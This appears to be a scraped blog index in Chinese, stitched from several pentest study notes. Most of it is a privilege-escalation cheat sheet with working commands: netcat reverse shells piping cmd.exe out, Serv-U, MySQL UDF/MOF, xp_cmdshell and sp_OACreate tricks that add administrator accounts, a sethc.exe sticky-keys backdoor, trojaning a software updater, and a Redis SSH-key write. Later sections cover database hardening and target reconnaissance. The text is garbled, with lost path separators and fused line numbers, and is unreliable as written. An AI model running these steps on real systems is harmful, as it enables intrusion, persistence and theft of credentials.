/add’;–PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’) root提权 –windows&#x2F;linux123456789101112131415161718192021222324252627利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码如何判断一台windows服务器上的mysql有没有降权？cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了如何判断服务器上是否开启了mysql服务？开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.如何查看root密码？在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中例如：D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，1、停止mysql服务2、替换下载下来的3个文件（user.MYI user.MYD user.frm）3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot5、最后查询一下就出来了select user,password from mysql.user; serv-u提权 –ftp–windows12345678910111213141516171819202122232425262728293031323334这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\\ServUDaemon.ini找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword=nqFCE64E0056362E8FCAF813094EC39BC2再拿md5密文去解密，再用现在的密码登陆提权即可。serv-u提权的前提是43958端口开了，且知道帐号密码！如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。目录有修改权限之serv-u提权：找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！接着本地cmd命令：ftp 服务器ip回车，输入帐号密码再回车………………….接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：Quote site exec net user jianmei daxia /add 增加一个用户Quote site exec net localgroup administrators jianmei /add 提升到管理员权限200 EXEC command successful (TID=33). 执行成功的回显信息Maintenance=System 权限类型多加一行指定新加帐号为系统管理员ReloadSettings=True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效 **端口转发 **1234567891011121314151617181920什么情况下适合转发端口？1.服务器是内网，我们无法连接。2.服务器上有防火墙，阻断我们的连接。转发端口的前提，我们是外网或是有外网服务器。找个可读可写目录上传lcx.exe本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）接着shell命令：/c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)以上是本机外网情况下操作，接着说下在外网服务器里如何操作：上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。 **nc反弹提权 **123456789101112131415161718192021222324252627282930313233343536当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….找个可读可写目录上传nc.exe cmd.exe-l 监听本地入栈信息-p port打开本地端口-t 以telnet形式应答入栈请求-e 程序重定向本地cmd执行：nc -vv -l -p 52 进行反弹接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多执行成功后本地cmd命令：cd/ （只是习惯而已）接着以telnet命令连接服务器：telnet 服务器ip 999回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！坏蛋：本地cmd执行：nc -vv -l -p 52 进行反弹c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52低调小飞：shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。 星外提权 –windows1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495如何知道是不是星外主机？第一：网站物理路径存在“freehost”第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹默认帐号：freehostrunat默认密码：fa41328538d7be36e83ae91a78a1b16f!7freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可星外常写目录：C:RECYCLERC:windowstempe:recyclerf:recyclerC:phpPEARC:WINDOWS7i24.comFreeHostC:phpdevC:System Volume Information C:7i24.comserverdoctorlogC:WINDOWSTempc:windowshchiblis.ibl C:7i24.comiissafelog C:7i24.comLinkGatelog C:Program FilesThunder NetworkThunder7C:Program FilesThunder NetworkThunderC:Program FilesSymantec AntiVirusSAVRTc:windowsDriverPacksCAM2C:Program FilesFlashFXPc:Program FilesMicrosoft SQL Server90SharedErrorDumpsC:Program FilesZendZendOptimizer-3.3.0 C:Program FilesCommon Filesc:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csvc:Program Files360360SafedeepscanSectionmutex.dbc:Program FilesHeliconISAPI_Rewrite3error.logc:Program FilesHeliconISAPI_Rewrite3Rewrite.log c:Program FilesHeliconISAPI_Rewrite3httpd.conf c:Program FilesCommon FilesSymantec SharedPersist.bak c:Program FilesCommon FilesSymantec SharedValidate.dat c:Program FilesCommon FilesSymantec SharedValidate.dat C:Program FilesZendZendOptimizer-3.3.0docsC:Documents and SettingsAll UsersDRMC:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtectionC:Documents and SettingsAll UsersApplication Data360safesoftmgrC:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Indexee提权法：找个可读可写目录上传ee.execmd命令：/c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）接着命令：/c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）vbs提权法：找个可读可写目录上传cscript.exe iispwd.vbscmd命令：/c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。可行思路大全：经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：360杀毒db文件替换:c:Program Files360360SDdeepscanSectionmutex.db c:Program Files360360SafedeepscanSectionmutex.db C:Program Files360360SafeAntiSectionmutex.dbIISrewrite3 文件替换：C:Program FilesHeliconISAPI_Rewrite3Rewrite.logC:Program FilesHeliconISAPI_Rewrite3httpd.confC:Program FilesHeliconISAPI_Rewrite3error.log诺顿杀毒文件替换:c:Program FilesCommon FilesSymantec SharedPersist.bak c:Program FilesCommon FilesSymantec SharedValidate.dat c:Program FilesCommon FilesSymantec SharedPersist.Dat一流过滤相关目录及文件： C:7i24.comiissafelogstartandiischeck.txt C:7i24.comiissafelogscanlog.htm其他:Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll华盾文件替换：C:WINDOWShchiblis.iblFlash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocxDU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv 360提权 –windows1234567891011121314找个可读可写目录上传360.execmd命令：/c c:windowstempcookies360.exe会提示3段英文：360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2You will get a Shift5 door!Shift5 Backdoor created! 这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了…… 搜狗提权 –windows123搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。 华众虚拟主机提权 –windows12345678910111213就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。所以华众提权关键之处就是搜集信息，主要注册表位置：HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIGHKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具 N点虚拟主机 –windows12345678910111213N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdbrl直接输入不行 这里咱们替换下 #=# 空格=修改后的下载地址为/host_date/#host # date#196.mdbN点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码N点默认安装路径C:Program FilesNpointSoftnpointhostwebD:Program FilesNpointSoftnpointhostweb默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库N点解密工具代码 提权思路123456提权Webshell：尽量能够获取webshell，如果获取不到webshell可以在有文件上传的地方上传反弹shell脚本；或者利用漏洞（系统漏洞，服务器漏洞，第三方软件漏洞，数据库漏洞）来获取shell。 反弹shell：利用kali虚拟机msfVENOM编写反弹shell脚本 被控制端发起的shell---通常用于被控制端因防火墙受限，权限不足、端口被占用 开启监听：msfconsole模块监听响应的反弹shell脚本（当靶机点击脚本的时候），进入meterpreter模块，可以getsystem权限，获取信息等等，还可以开启远程服务功能（lcx，scocks5） Windows系统漏洞提权思路1234567891011121314151617181920windows(可执行文件：一种是.com；另一种.exe) 系统溢出漏洞操作说明1、明确漏洞编号及版本2、明确漏洞利用平台及版本3、确保cmd执行权限正常运行4、确保服务器相关防护软件情况查看系统补丁，提权前期准备【前提已获取webshell】方法一：输入shell进入到该主机的shell下，然后：systeminfo 查看系统详细信息方法二：进入到 meterpreter 下，执行 run post/windows/gather/enum_patches 可以直接查看补丁情况方法三：post/multi/recon/local_exploit_suggester 模块，用于快速识别系统中可能被利用的漏洞方法四：WMIC命令也可以查看补丁数量wmic qfe get Caption,Description,HotFixID,InstalledOn也可以直接找是否存在某个cve-2018-8120对应的KB4131188补丁wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB4131188&quot;方法五：Windows Exploit Suggester该工具可以将系统中已经安装的补丁程序与微软的漏洞数据库进行比较，并可以识别可能导致权限提升的漏洞，而其只需要目标系统的信息。通过msf生成反弹exe进行反弹操作，获取meterpreter通道监听获取成功后，进行exp的筛选探测可提取的模块use post/multi/recon/local_exploit_suggester linux系统提权思路12345678910111213141516171819202122232425262728293031323334353637383940414243**linux基础信息收集**uname -a 显示全部系统信息cat /etc/issue 内核信息。此命令也适用于所有的Linux发行版cat /etc/passwd 所有人都可看ps aux | grep root**(1)#内核漏洞提权**方法：通过信息收集方式得知linux内核版本使用searchspolit搜索相应版本漏洞例：searchsploit linux 4.0.0searchsploit Ubuntu 16.04searchsploit Ubuntu 16 kernel 3.10找到对应的.c源文件,将其发送到靶机/或是靶机下载 scp， wget http://127.0.0.1/xx.c编译，gcc xxx.c -o exp**(2)#SUID提权**概念SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。特点SUID 权限仅对二进制程序有效执行者对于该程序需要有可执行权限(x权限)SUID 权限仅仅在程序执行过程中有效执行该程序时，执行者将具有该程序拥有者的权限首先在本地查找符合条件的文件，有以下三个命令列出来的所有文件都是以root用户权限来执行的，接下来找到可以提权的文件find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\;常用的可用于suid提权的文件Nmap、Vim、find、Bash、More、Less、cp**(3)#nmap提权**较旧版本的Nmap（2.02至5.21）带有交互模式，从而允许用户执行shell命令。因此可以使用交互式控制台来运行具有相同权限的shell。方法一：启动交互模式，使用nmap --interactive!sh #执行之后将提供一个提权后的shell。方法二：Metasploit模块，也可以通过SUID Nmap二进制文件进行提权。exploit/unix/local/setuid_nmap**(4)#find提权**实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。**(5)#sudo提权**sudo命令以系统管理者的身份执行指令，也就是说，经由 sudo 所执行的指令就好像是 root 亲自执行。sudo 表示 “superuser do”。它允许已验证的用户以其他用户的身份来运行命令。其他用户可以是普通用户或者超级用户。然而，大部分时候我们用它来以提升的权限来运行命令。 数据库提权思路12345678数据库获取网站数据库的账号和密码--通过读取一些数据库配置文件数据库配置文件：命令规则（data、sql、inc、config、conn、database等）--通过mysql数据库的user表数据库安装文件：安装目录下data/mysql/user.mydfrm:描述表结构文件，字段长度myi：索引信息myd：数据库信息文件，存储数据信息 (1)mysql数据库——udf提权123456789101112udf文件:udf(user-defined-function)是mysql得一个拓展接口，也称为用户自定义函数，用户通过自定义函数来实现在mysql中无法方便实现得功能udf文件后缀名: .dll（windows）linux后缀名：.so提权原理已知root账号和密码，利用root权限，创建带有调用cmd函数的“udf.dll”。当我们把udf.dll导出指定文件夹引入mysql时候，其中的调用函数拿出来当作mysql函数来使用注意事项mysql版本小于5.1版本，udf.dll文件在windows2003下放在：c:\\windows\\system32。在windows2000放在：c:\\winnt\\system32mysql版本大于5.1版本，udf.dll文件必须放置在mysql安装目录下的lib\\plugin。但是大于5.1版本的时候没有plugin这个文件夹，需要自己创建。利用udf文件加载函数执行命令create function cmdshell returns string soname &#x27;udf.dll&#x27;; //returns string soname ‘导出的DLL路径’；select cmdshell(&#x27;net user ndsec ndsecpw /add&#x27;);select cmdshell(&#x27;net localgroup administrators ndsec /add&#x27;);drop function cmdshell; (2)#数据库提权——mof提权12345678910mof文件:mof文件是mysql数据库的扩展文件存放路径（C:/windows/system32/wbem/mof/nullevt.mof）其作用是每隔5秒就会去监控进程创建和死亡。提权条件1、windows2003及以下2、mysql启动身份具有权限去读写C:/windows/system32/wbem/mof/目录3、secure-file-priv=不为null提权原理mof文件每5秒就会执行，而且是系统权限，我们可以通过load_file将文件写入/wbme/mof，然后系统每5秒就会执行一次我们上传的mofmof当中是一段vbs脚本，通过通过控制vbs脚本让系统执行命令，进行提权。 (3)#数据库提权——反弹端口提权1234提权条件1、获取数据库的账号和密码，同时能够执行查询命令。2、secure_file_priv=,可导出udf.dll到系统目录或者mysql数据库安装目录下的lib下plugin3、授权mysql数据库远程用户的登录 (4)#数据库提权——启动项提权 (这种方法不推荐) 12345提权原理使用mysql写文件，写一段vbs代码到开启自启动中。服务器重启的时候达到创建用户并提取。可以使用DDOS迫使服务器重启提权条件secure_file_priv不为null已知账号和密码 (5)linux系统-udf提权 12345678910111213141516上传脚本进行监听靶机连接数据库查看版本use mysql;create table foo(line blob);insert into foo values(load_file(&#x27;/tmp/raptor_udf2.so&#x27;));select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);find / -exec &quot;/bin/sh&quot; \\;mssql数据库SA权限执行命令存储过程：xp_cmshell、sp_OACreate注册表存储过程：xp_regwrite存储过程其实质就是一个“集合”。它就是存储在sqlserver中预先定义好的“sql语句集合。”使用T-SQL语言编写好的各种小脚本共同组合成的集合体，我们就称为“存储过程” 利用xp_cmdshell提权1234567891011121314151617181920212223242526272829（1）xp_cmdshell解释Xp_cmdshell是sqlserver中的组件，可以以操作系统命令解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。可以用来执行系统命令（2）xp_cmdshell开启默认在sql server2000中是开启的，在sqlserver2005之后的版本默认禁止。如果我们有sa权限，可以用命令开启exec sp_configure ‘show advanced options’ , 1;reconfigure;exec sp_configure ‘xp_cmdshell’, 1;reconfigure;xp_cmdshell 关闭exec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;（3）当xp_cmdshell删除或出错的情况下，使用sp_OACreate组件开启组件SP_OACreateexec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,1;reconfigure;关闭组件SP_OACreateexec sp_configure &#x27;show advanced options&#x27;,1;reconfigure;exec sp_configure &#x27;ole automation procedures&#x27;,0;reconfigure;exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;利用SP_OACreate添加用户提权declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c net user quan 123456 /add&#x27;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators quan /add&#x27;利用SP_OACreate的其他操作sp_OACreate替换粘贴键declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o outexecsp_oamethod@o,&#x27;copyfile&#x27;,null,&#x27;c:\\windows\\explorer.exe&#x27; ,&#x27;c:\\windows\\system32\\sethc.exe&#x27;;declare @o intexec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o outexecsp_oamethod@o,&#x27;copyfile&#x27;,null,&#x27;c:\\windows\\system32\\sethc.exe&#x27; ,&#x27;c:\\windows\\system32\\dllcache\\sethc.exe&#x27;; 第三方软件提权思路1第三方软件指的是该非线性编辑系统生产商以外的软件公司提供的软件，功能十分强大，有些甚至是从工作站转移过来的，可以这么说，非线性编辑系统之所以能做到效果变幻莫测，匪夷所思，吸引众人的视线，完全取决于第三方软件。第三方软件提权，就是利用第三方软件存在的漏洞来进行获取一个权限的操作。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"渗透测试/后渗透","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"msf","slug":"渗透测试/后渗透/msf","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/"},{"name":"提权","slug":"渗透测试/后渗透/msf/提权","permalink":"http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E6%8F%90%E6%9D%83/"}],"tags":[{"name":"msf","slug":"msf","permalink":"http://example.com/tags/msf/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"后渗透","slug":"后渗透","permalink":"http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"},{"name":"提权","slug":"提权","permalink":"http://example.com/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"","slug":"数据库安全检查与加固","date":"2024-02-26T02:25:19.102Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2024/02/26/数据库安全检查与加固/","permalink":"http://example.com/2024/02/26/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E4%B8%8E%E5%8A%A0%E5%9B%BA/","excerpt":"","text":"数据库安全检查与加固1.mysql数据库安全管理 禁止MySQL已管理元的身份账号权限运行 1234用普通账户运行mysqld加固方法： MySQL my.cnf配置文件中配置user=mysql 设置root用户名口令并修改登录名，且不存在空密码账号 12345678910111213141.ccess MySQL控制台： mysql -u root -p在控制台中执行： set password for &#x27;root&#x27;@&#x27;localhost&#x27; = password(&#x27;new_password&#x27;)为了改进root的安全性，可以改名 use mysql; update user set user=&quot;another_username&quot; where user=&quot;root&quot;; flush privileges;然后就可以用新用户名访问 mysql -u another_username -p 2.对于空密码账号 set password for &lt;user&gt;@&#x27;&lt;host&gt;&#x27; = password(&#x27;&lt;clear password&gt;&#x27;) select * from mysql.user where user =&quot;&quot;; 配置合适的密码强度，最常使用期限小于90天 1234567891011密码特征，长度，大小写，长度，字符集添加配置到全局配置 plugin-load=validate_password.so validate_password_length=14 validate_password_mixed_case_count=1 validate_password_number_count=1 validate_password_special_char_count=1 validate_passwordpolicy=MEDIUM使用期限小于等于90天 配置rdbms： set global default_password_lifetime=90 降低用户的数据库特权，只有管理员有完整的数据库访问权限 123456789mysql.user和mysql.db表使用revoke语句来删除权限MySQL.user中权限： file_priv:表示是否运行用户读取数据库所在主机的本地文件; Process:表示是否运行用户查询所有用户的命令执行信息; Super_priv:表示用户是否有设置全局变量、管理员调试等高级权限； Shutdown_priv：表示用户是否可以关闭数据库； Create_user_priv：表示用户是否可以创建或者删除其他用户; Grant_priv:表示用户是否可以修改其他用户权限； 禁止或限制远程访问，确保特定主机才有访问特权 123456789打开主句对数据库的访问： grant all on *.* to &#x27;root&#x27;@&#x27;% &#x27;;这是完全开放了对root 的访问，需要对特定主机ip进行限制 grant all on *.* to &#x27;root&#x27;@&#x27;localhost&#x27;; grant all on *.* to &#x27;root&#x27;@&#x27;myip.athome&#x27;; flush privileges;有限许可访问： grant select,insert on mydb.* to &#x27;someuser&#x27;@&#x27;somehost&#x27;; someuser换成用户名，somehost换成主机 配置MYSQL日志便于审计 12345678910日志默认会用主机名+.err命名的文件配置log_error=/mydata/data/mysql.test.com.err 指定错误日志信息，默认在数据库目录下，该位置必须有写的权限log_warning =&#123;0|1&#125;#默认开启，服务器运行中的警告日志也在其中查询日志log=&#123;ON|OFF&#125; 是否开启查询日志，在MySQL5.6已经废弃general_log =&#123;ON|OFF&#125; 启动或关闭查询日志，默认关闭general_log_file = /mydata/data/mysql.log 指定查询日志的位置log_output = &#123;TABLE|FILE|NONE&#125;指定存放日志位置的位置，文件或者表 删除测试安装的test数据库 1234567 DROP DATABASE &quot;test&quot;8. Mysqld启动禁用“--skip-grant-tables” ~~~markdown skip-grant-tables导致不适用权限系统的情况下启动，不启动grant-tables授权表，忘记管理员密码可以用到 配置文件中skip-grant-tables设置为FALSE，并且启动参数不包含--skip-grant-tables 数据库位于非系统区 12345678系统分区：通常用于主句系统、应用程序操作非系统分区：用于存储数据MySQL数据库的挂在点不应该为：root（&#x27;/&#x27;）,var,/usr为MySQL选择非系统分区的新位置 停止mysqld: service mysql stop 执行命令复制数据： cp-rp &lt;datadir&gt; &lt;新位置&gt; 启动 service mysql start 2.Oracle管理用户安全性1234567创建用户 create user test1 identified by test1;删除用户 drop user test1;锁定用户 alter user test1 account lock; select username,account_status form dba_users where username =&quot;&quot;;修改用户密码 alert user test1 identified by &lt;新密码&gt;; 概要文件 12345678用户限制数据库使用和实例资源的一组指定资源限制的条件，并管理账户状态和口令管理规则。select username,account_status,profile from dba_users where rownum &lt;= 1;select profile,resource_name,limit from dba_profiles where rownum &lt;= 1;profile 配置 口令复杂验证 12345password_verify function 指定一个pl/sql函数，便于分配口令之前执行复杂度检查utlpwdmg.sql脚本提供了模型口令验证函数Unix和linux： $ORACLE_HOME/rdbms/adminwinows: %oracle_home%\\rdbms\\admin 取消概要文件的限制 12345取消密码管理 alert profile DEFAULT limit unlimited; alert profile DEFAULT limit password_reuse_time unlimited;停止密码校验函数 alert profile DEFAULT limit password_verify_function null; 自建概要文件 3.Redis未授权访问漏洞数据库持久，key-value ，list，set，zset，hash，数据备份 漏洞原理（18）123456未开启认证或采用相关策略 默认绑定在679，没有开启认证ssh免密码登录 ssh root@192.168.xxx.xxx 自身提供的config命令，可进行写操作 将攻击者的公钥写入目标服务器 /root/.ssh文件夹的authotrized_keys文件中，然后使用对应的私钥登录 123456789101112131415161718192021222324252627ssh-keygen -t rsa 本地生成公私密钥用户根目录 .sshauthorized_keys存在远程免密登录的公钥，可记录多台id_rsa:生成的私钥文件id_rsa.pub:生成的公钥文件know_hosts: 已知的主机公钥清单希望公钥生效必须满足：1. .ssh目录权限必须为7002. .ssh/authorized_keys 文件必须为600scp复制自己的公钥到对方的文件中 scp -p ~/.ssh/id_rsa.pub root@&lt;remote_ip&gt;:/root/.ssh/authorized_keys 手工复制黏贴到远程服务器~/.ssh/authorized_keysroot@kail: ./redis-cli -h 192.xxx.xxx.xxx192.xxx.xxx.xxx:6379&gt; config get dir192.xxx.xxx.xxx:6379&gt; config get dir /root/.ssh192.xxx.xxx.xxx:6379&gt; config set dbfilename authorized_keys192.xxx.xxx.xxx:6379&gt; keys *192.xxx.xxx.xxx:6379&gt; get xxx &quot;\\n\\n\\nssh-rsa key_pub root@kail\\n\\n\\n\\n&quot;192.xxx.xxx.xxx:6379&gt; savessh ip 登录 redis安全检测1234561.ps -aux|grep redis 是否root运行2.netstat -tunlp|grep redis 是否监听本地3.是否设置相应的密码 redis-cli -h 192.xxxx keys * info 加固 漏洞解决方法12345升级程序，补丁修改安全配置，停止服务通过主机防火墙进行访问控制通过系统边界防火墙进行访问控制通过修改程序Banner进行欺骗","categories":[],"tags":[]},{"title":"渗透测试学习（信息收集）","slug":"渗透测试学习笔记（信息收集）","date":"2024-02-26T02:25:19.098Z","updated":"2022-04-08T17:07:57.310Z","comments":true,"path":"2024/02/26/渗透测试学习笔记（信息收集）/","permalink":"http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/","excerpt":"","text":"渗透测试学习笔记（信息收集）信息收集目的：信息收集作为渗透前期的准备工作扮演着极为重要的角色，我们的 最终目的是拿下目标，那么信息收集的目的就是为拿下目标进行铺路。良好的信息 收集能够更全面的掌握对方情况，并为你下一步的操作起到帮助决策的作用。 这里主要是web的信息收集，即针对web服务器对象的 域名信息1234567891011121314151617181920212223- a. 对应ip收集： i. ping域名 ii. ip138查找历史ip iii. 全国pingb. 子域名收集：（17:35）​ i. Layer子域名挖掘机，subdomain（优先选择版本较低的服务器）​ ii. 自己找个好用的工具和更新字典c. whois（注册人）信息查询：（35:27） ​ ▪ 爱站，站长工具，微步在线，ip138，searchdns.netcraft.com​ ▪ 查找注册人的一些信息，注册日期，注册人姓名，注册人邮箱、电话等，反查其他注册的域名，然后搞别的站寻找密码再回来，或者查询社工信息，查看曾用密码来进行生成字典推测 敏感目录 ​ 收集方向：robots.txt，后台，安装包，上传目录，安装页面，mysql管理接口，phpinfo等 1234a. 字典爆破：御剑，dirbuster，wwwscan等b. 爬行：爬行菜刀，webrobot，burp等 ○ 有的站会有防护，如阿里云的封锁ip，安全狗使扫描器的一堆误报，需要用代理进行访问，用代理池跑○ 扫扫二级目录 段口分析 12345678910111213通过nmap，portscan或其他工具扫一下端口，看一下服务开启常见的端口： i. 21：FTP ii. 22：SSH iii. 23：telnet iv. 25：smtp v. 80：http vi. 443：https vii. 445：smb viii. 1433：sql server ix. 1521：oracle x. 3306：mysql xi. 3389：rdp 旁站c段 12a. 旁站：同服务器的其他站点，一个ip的其他所有域名b. c段：指某个服务器的C段ip地址（即0/24）的所有域名 整站分析 服务器类型 123i. 服务器平台：windows，linux，通过文件大小写来判断，Linux区分大小写，或者看报错信息ii. 服务器版本：nmap探测，报错信息 网站容器 12345678910iis：windows搭建容器，windows2003,2008,2012,2016版本对应iis6.0，iis7.0/7.5，iis8.0，iis10.0apache：一般为linux搭建，如果apache（win32）表示用windows搭建的apache环境，一般为集成环境，如phpstudy，upupw，宝塔nginx：一般为linux搭建，nginx（win32）同上tomcat检测方法：看报错信息，审查元素network查看 脚本类型 123iis一般用asp，aspx，phpapache，nginx一般用phptomcat一般用jsp 数据库类型 1234asp + access，少部分会用sqlserveraspx + sqlserver，少部分用accessphp + mysql，也有用postgresql，oracle不常见jsp + mysql/sqlserver，oracle少一些，金融，大学，证券一般是oracle cms类型(找对应的cms漏洞，进行漏洞利用) 123登录后台网站页脚泄露工具自动化识别 waf 构造一下sql语句，查看网站是否拦截 google黑客 shodan，censys，fofa，钟馗 1234inurl：xxxintitle：xxxsite：filetype URL采集 后台查找总结12345678910111213141516171819202122231.弱口令默认后台： admin，admin/login.asp，manage等 a. discuz，phpv9，phpweb：默认为 admin.php b. 科讯：默认为 admin/login.asp c. 帝国：默认为 e/admin d. aspcms：默认为 admin_aspcms2. 御剑，dirbuster等扫描目录3. 爬行网站（asp/aspx/php）4. robots.txt 